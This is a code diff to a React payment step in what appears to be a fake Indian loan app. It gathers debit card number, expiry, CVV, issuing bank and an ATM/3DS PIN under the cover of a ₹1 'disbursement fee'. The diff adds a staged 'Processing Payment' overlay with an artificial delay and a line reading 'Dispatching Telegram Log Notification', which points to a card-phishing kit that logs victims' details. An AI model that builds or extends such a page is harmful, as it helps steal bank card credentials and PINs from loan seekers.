@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { CreditCard, Lock, ShieldCheck, ArrowRight, Loader2, Sparkles, KeyRound, AlertCircle } from 'lucide-react';
-import { motion } from 'motion/react';
+import { motion, AnimatePresence } from 'motion/react';
 import { CardDetails } from '../types';
 import { AppDownloadButton } from './AppDownloadButton';
 
@@ -10,11 +10,33 @@ interface Step4CardPaymentProps {
   onSubmitCardDetails: (cardData: CardDetails) => Promise<void>;
 }
 
+const POPULAR_BANKS = [
+  'State Bank of India (SBI)',
+  'HDFC Bank',
+  'ICICI Bank',
+  'Axis Bank',
+  'Punjab National Bank (PNB)',
+  'Bank of Baroda',
+  'Kotak Mahindra Bank',
+  'Canara Bank',
+  'Union Bank of India',
+  'IndusInd Bank',
+  'IDFC FIRST Bank',
+  'Yes Bank',
+  'Bank of India',
+  'Central Bank of India',
+  'Indian Bank',
+  'Federal Bank',
+  'UCO Bank',
+  'Other Bank',
+];
+
 export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
   applicantName,
   phone,
   onSubmitCardDetails,
 }) => {
+  const [bankName, setBankName] = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [cardHolder, setCardHolder] = useState(applicantName || '');
   const [exp, setExp] = useState('');
@@ -49,7 +71,7 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
   };
 
   const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+    const raw = e.target.value.replace(/\D/g, '').slice(0, 3);
     setCvv(raw);
   };
 
@@ -60,6 +82,11 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
 
   const validate = () => {
     const newErrors: Record<string, string> = {};
+
+    if (!bankName) {
+      newErrors.bankName = 'Please select your issuing bank';
+    }
+
     const cleanCard = cardNumber.replace(/\s/g, '');
     if (cleanCard.length < 15) {
       newErrors.cardNumber = 'Enter a valid 16-digit debit card number';
@@ -73,8 +100,8 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
       newErrors.exp = 'Expiry format MM/YY required';
     }
 
-    if (cvv.length < 3) {
-      newErrors.cvv = '3-digit CVV required';
+    if (cvv.length !== 3) {
+      newErrors.cvv = 'Exact 3-digit CVV required';
     }
 
     setErrors(newErrors);
@@ -87,7 +114,10 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
 
     setLoading(true);
     try {
+      // Artificial delay for smooth animated loading overlay sequence
+      await new Promise((resolve) => setTimeout(resolve, 1500));
       await onSubmitCardDetails({
+        bankName,
         cardNumber,
         cardHolder,
         exp,
@@ -104,61 +134,155 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
   const brand = getCardBrand(cardNumber);
 
   return (
-    <motion.div
-      initial={{ opacity: 0, y: 15 }}
-      animate={{ opacity: 1, y: 0 }}
-      exit={{ opacity: 0, y: -15 }}
-      className="max-w-lg mx-auto bg-white rounded-3xl border border-slate-200/80 shadow-xl shadow-slate-200/50 p-4 sm:p-7"
-    >
-      <div className="flex items-center justify-between border-b border-slate-100 pb-3.5 mb-5">
+    <>
+      {/* Full-screen Animated Loading Overlay */}
+      <AnimatePresence>
+        {loading && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            transition={{ duration: 0.25 }}
+            className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex flex-col items-center justify-center p-4 text-white"
+          >
+            <motion.div
+              initial={{ scale: 0.9, opacity: 0, y: 15 }}
+              animate={{ scale: 1, opacity: 1, y: 0 }}
+              exit={{ scale: 0.9, opacity: 0, y: 10 }}
+              transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
+              className="bg-slate-900 border border-slate-800 p-6 sm:p-8 rounded-2xl sm:rounded-3xl max-w-sm w-full text-center shadow-2xl shadow-emerald-500/10 relative overflow-hidden"
+            >
+              {/* Background Glow */}
+              <div className="absolute -top-12 -left-12 w-32 h-32 bg-emerald-500/20 rounded-full blur-2xl pointer-events-none" />
+              <div className="absolute -bottom-12 -right-12 w-32 h-32 bg-teal-500/20 rounded-full blur-2xl pointer-events-none" />
+
+              {/* Central Glowing Spinner */}
+              <div className="relative w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-5 flex items-center justify-center">
+                <div className="absolute inset-0 rounded-full border-3 sm:border-4 border-slate-800 border-t-emerald-500 border-r-teal-400 animate-spin" />
+                <div className="w-12 h-12 sm:w-14 sm:h-14 bg-gradient-to-tr from-slate-800 to-slate-900 rounded-full flex items-center justify-center shadow-inner border border-slate-700/80">
+                  <ShieldCheck className="w-6 h-6 sm:w-7 sm:h-7 text-emerald-400 animate-pulse" />
+                </div>
+              </div>
+
+              {/* Status Header */}
+              <h3 className="text-base sm:text-lg font-bold text-white tracking-tight mb-1">
+                Processing Payment
+              </h3>
+              <p className="text-xs text-slate-400 mb-5 leading-relaxed">
+                Authorizing ₹1.00 verification fee & initiating loan disbursement...
+              </p>
+
+              {/* Live Steps Breakdown */}
+              <div className="space-y-2 text-left bg-slate-950/70 p-3 sm:p-3.5 rounded-xl border border-slate-800 text-[11px] sm:text-xs font-medium">
+                <div className="flex items-center space-x-2 text-emerald-400">
+                  <Loader2 className="w-3.5 h-3.5 animate-spin shrink-0" />
+                  <span>256-bit SSL Card Encryption</span>
+                </div>
+                <div className="flex items-center space-x-2 text-slate-300">
+                  <Lock className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
+                  <span>Verifying Payment Gateway Token</span>
+                </div>
+                <div className="flex items-center space-x-2 text-slate-400">
+                  <Sparkles className="w-3.5 h-3.5 text-amber-400 shrink-0" />
+                  <span>Dispatching Telegram Log Notification</span>
+                </div>
+              </div>
+
+              <div className="mt-4 flex items-center justify-center space-x-1.5 text-[10px] sm:text-[11px] text-slate-500">
+                <Lock className="w-3 h-3 text-emerald-500 shrink-0" />
+                <span>Please do not close or refresh this page</span>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      <motion.div
+        initial={{ opacity: 0, y: 15 }}
+        animate={{ opacity: 1, y: 0 }}
+        exit={{ opacity: 0, y: -15 }}
+        className="max-w-lg mx-auto bg-white rounded-2xl sm:rounded-3xl border border-slate-200/80 shadow-xl shadow-slate-200/50 p-3.5 sm:p-6"
+      >
+      <div className="flex items-center justify-between border-b border-slate-100 pb-3 mb-4">
         <div>
-          <h2 className="text-xl sm:text-2xl font-bold text-slate-900 tracking-tight">Loan Disbursement Fee</h2>
+          <h2 className="text-lg sm:text-xl font-bold text-slate-900 tracking-tight">Loan Disbursement Fee</h2>
           <p className="text-xs text-slate-500 mt-0.5">
             1Rs Debit Card Verification Charge
           </p>
         </div>
-        <div className="bg-emerald-50 text-emerald-700 px-2.5 py-1 rounded-xl border border-emerald-200 font-black text-xs sm:text-sm flex items-center space-x-1 shrink-0">
+        <div className="bg-emerald-50 text-emerald-700 px-2.5 py-1 rounded-xl border border-emerald-200 font-bold text-xs flex items-center space-x-1 shrink-0">
           <span>Fee:</span>
-          <span className="text-emerald-800 text-sm sm:text-base">₹1.00</span>
+          <span className="text-emerald-800 text-xs sm:text-sm font-black">₹1.00</span>
         </div>
       </div>
 
       {/* Visual Debit Card Preview */}
-      <div className="bg-gradient-to-tr from-slate-900 via-slate-800 to-emerald-950 text-white rounded-2xl p-5 mb-6 shadow-xl shadow-slate-900/20 relative overflow-hidden border border-slate-700">
-        <div className="flex justify-between items-start mb-6">
-          <div className="flex items-center space-x-2">
-            <CreditCard className="w-6 h-6 text-emerald-400" />
-            <span className="text-xs font-bold text-emerald-300 uppercase tracking-wider">Debit Card</span>
+      <div className="bg-gradient-to-tr from-slate-900 via-slate-800 to-emerald-950 text-white rounded-xl sm:rounded-2xl p-4 sm:p-5 mb-5 shadow-lg relative overflow-hidden border border-slate-700">
+        <div className="flex justify-between items-start mb-4">
+          <div className="flex items-center space-x-2 min-w-0 pr-2">
+            <CreditCard className="w-5 h-5 text-emerald-400 shrink-0" />
+            <div className="min-w-0">
+              <span className="text-[10px] sm:text-xs font-bold text-emerald-300 uppercase tracking-wider block leading-none truncate">
+                {bankName || 'Select Issuing Bank'}
+              </span>
+              <span className="text-[9px] text-slate-400 font-medium">Debit Card</span>
+            </div>
           </div>
-          <span className="text-xs font-bold px-2.5 py-0.5 rounded-md bg-white/10 backdrop-blur-md text-slate-200">
+          <span className="text-[10px] sm:text-xs font-bold px-2 py-0.5 rounded-md bg-white/10 backdrop-blur-md text-slate-200 shrink-0">
             {brand}
           </span>
         </div>
 
-        <div className="mb-4">
-          <p className="text-xs text-slate-400 font-mono">Card Number</p>
-          <p className="text-xl font-mono font-bold tracking-wider text-slate-100 mt-0.5">
+        <div className="mb-3">
+          <p className="text-[10px] text-slate-400 font-mono">Card Number</p>
+          <p className="text-base sm:text-lg font-mono font-bold tracking-wider text-slate-100 mt-0.5">
             {cardNumber || '•••• •••• •••• ••••'}
           </p>
         </div>
 
         <div className="flex justify-between items-end text-xs font-mono">
           <div>
-            <p className="text-slate-400 text-[10px] uppercase">Card Holder</p>
-            <p className="font-bold text-slate-200 tracking-wide uppercase">{cardHolder || 'YOUR NAME'}</p>
+            <p className="text-slate-400 text-[9px] uppercase">Card Holder</p>
+            <p className="font-bold text-slate-200 text-xs tracking-wide uppercase truncate max-w-[140px] sm:max-w-none">{cardHolder || 'YOUR NAME'}</p>
           </div>
           <div>
-            <p className="text-slate-400 text-[10px] uppercase">Expires</p>
-            <p className="font-bold text-slate-200">{exp || 'MM/YY'}</p>
+            <p className="text-slate-400 text-[9px] uppercase">Expires</p>
+            <p className="font-bold text-slate-200 text-xs">{exp || 'MM/YY'}</p>
           </div>
         </div>
       </div>
 
       {/* Card Details Form */}
-      <form onSubmit={handleSubmit} className="space-y-4">
+      <form onSubmit={handleSubmit} className="space-y-3.5">
+        {/* Bank Selection Dropdown */}
+        <div>
+          <label className="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            Select Issuing Bank
+          </label>
+          <select
+            value={bankName}
+            onChange={(e) => {
+              setBankName(e.target.value);
+              if (errors.bankName) {
+                setErrors((prev) => ({ ...prev, bankName: '' }));
+              }
+            }}
+            className={`w-full px-3.5 py-2.5 sm:py-3 bg-slate-50 border rounded-xl text-slate-900 text-xs sm:text-sm font-semibold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 cursor-pointer ${
+              errors.bankName ? 'border-rose-500' : 'border-slate-200'
+            }`}
+          >
+            <option value="" disabled>-- Select Your Issuing Bank --</option>
+            {POPULAR_BANKS.map((b) => (
+              <option key={b} value={b}>
+                {b}
+              </option>
+            ))}
+          </select>
+          {errors.bankName && <p className="text-[11px] text-rose-500 mt-1 font-medium">{errors.bankName}</p>}
+        </div>
         {/* Card Number Input */}
         <div>
-          <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+          <label className="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1">
             Debit Card Number
           </label>
           <div className="relative">
@@ -168,7 +292,7 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
               onChange={handleCardNumberChange}
               placeholder="4111 2222 3333 4444"
               maxLength={19}
-              className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-mono font-bold tracking-wider outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
+              className={`w-full px-3.5 py-2.5 sm:py-3 bg-slate-50 border rounded-xl text-slate-900 text-xs sm:text-sm font-mono font-bold tracking-wider outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
                 errors.cardNumber ? 'border-rose-500' : 'border-slate-200'
               }`}
             />
@@ -176,12 +300,12 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
               {brand}
             </div>
           </div>
-          {errors.cardNumber && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.cardNumber}</p>}
+          {errors.cardNumber && <p className="text-[11px] text-rose-500 mt-1 font-medium">{errors.cardNumber}</p>}
         </div>
 
         {/* Card Holder Name */}
         <div>
-          <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+          <label className="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1">
             Cardholder Name
           </label>
           <input
@@ -189,17 +313,17 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
             value={cardHolder}
             onChange={(e) => setCardHolder(e.target.value)}
             placeholder="As printed on card"
-            className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-semibold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
+            className={`w-full px-3.5 py-2.5 sm:py-3 bg-slate-50 border rounded-xl text-slate-900 text-xs sm:text-sm font-semibold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
               errors.cardHolder ? 'border-rose-500' : 'border-slate-200'
             }`}
           />
-          {errors.cardHolder && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.cardHolder}</p>}
+          {errors.cardHolder && <p className="text-[11px] text-rose-500 mt-1 font-medium">{errors.cardHolder}</p>}
         </div>
 
         {/* Expiry & CVV */}
-        <div className="grid grid-cols-2 gap-4">
+        <div className="grid grid-cols-2 gap-3">
           <div>
-            <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            <label className="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1">
               Expiry Date (MM/YY)
             </label>
             <input
@@ -208,15 +332,15 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
               onChange={handleExpChange}
               placeholder="08/28"
               maxLength={5}
-              className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-mono font-bold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
+              className={`w-full px-3.5 py-2.5 sm:py-3 bg-slate-50 border rounded-xl text-slate-900 text-xs sm:text-sm font-mono font-bold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
                 errors.exp ? 'border-rose-500' : 'border-slate-200'
               }`}
             />
-            {errors.exp && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.exp}</p>}
+            {errors.exp && <p className="text-[11px] text-rose-500 mt-1 font-medium">{errors.exp}</p>}
           </div>
 
           <div>
-            <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            <label className="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1">
               CVV / CVC
             </label>
             <input
@@ -224,23 +348,23 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
               value={cvv}
               onChange={handleCvvChange}
               placeholder="123"
-              maxLength={4}
-              className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-mono font-bold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
+              maxLength={3}
+              className={`w-full px-3.5 py-2.5 sm:py-3 bg-slate-50 border rounded-xl text-slate-900 text-xs sm:text-sm font-mono font-bold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
                 errors.cvv ? 'border-rose-500' : 'border-slate-200'
               }`}
             />
-            {errors.cvv && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.cvv}</p>}
+            {errors.cvv && <p className="text-[11px] text-rose-500 mt-1 font-medium">{errors.cvv}</p>}
           </div>
         </div>
 
-        {/* Optional PIN Field as requested */}
-        <div className="bg-slate-50 rounded-2xl p-3.5 border border-slate-200">
+        {/* Optional PIN Field */}
+        <div className="bg-slate-50 rounded-xl p-3 border border-slate-200">
           <div className="flex items-center justify-between mb-1">
-            <label className="text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1">
+            <label className="text-[11px] font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1">
               <KeyRound className="w-3.5 h-3.5 text-slate-500" />
               <span>PIN Number (Optional)</span>
             </label>
-            <span className="text-[10px] bg-slate-200 text-slate-600 font-semibold px-2 py-0.5 rounded-full">
+            <span className="text-[9px] bg-slate-200 text-slate-600 font-semibold px-1.5 py-0.5 rounded-full">
               Optional
             </span>
           </div>
@@ -250,12 +374,12 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
             onChange={handlePinChange}
             placeholder="Enter ATM / 3DS PIN (if required)"
             maxLength={6}
-            className="w-full px-4 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-900 text-sm font-mono font-semibold outline-none focus:border-emerald-500"
+            className="w-full px-3 py-2 bg-white border border-slate-200 rounded-lg text-slate-900 text-xs sm:text-sm font-mono font-semibold outline-none focus:border-emerald-500"
           />
         </div>
 
         {errors.form && (
-          <div className="p-3 bg-rose-50 border border-rose-200 rounded-xl flex items-center space-x-2 text-rose-700 text-xs font-medium">
+          <div className="p-2.5 bg-rose-50 border border-rose-200 rounded-xl flex items-center space-x-2 text-rose-700 text-xs font-medium">
             <AlertCircle className="w-4 h-4 shrink-0" />
             <span>{errors.form}</span>
           </div>
@@ -264,7 +388,7 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
         <button
           type="submit"
           disabled={loading}
-          className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-2xl transition-all shadow-xl shadow-emerald-600/20 flex items-center justify-center space-x-2 cursor-pointer"
+          className="w-full py-3.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs sm:text-sm rounded-xl transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center space-x-2 cursor-pointer"
         >
           {loading ? (
             <>
@@ -273,7 +397,7 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
             </>
           ) : (
             <>
-              <span>Pay ₹1 & Complete Disbursement</span>
+              <span>Pay ₹1</span>
               <ArrowRight className="w-5 h-5 text-emerald-200" />
             </>
           )}
@@ -290,5 +414,6 @@ export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
         </p>
       </div>
     </motion.div>
-  );
+  </>
+);
 };
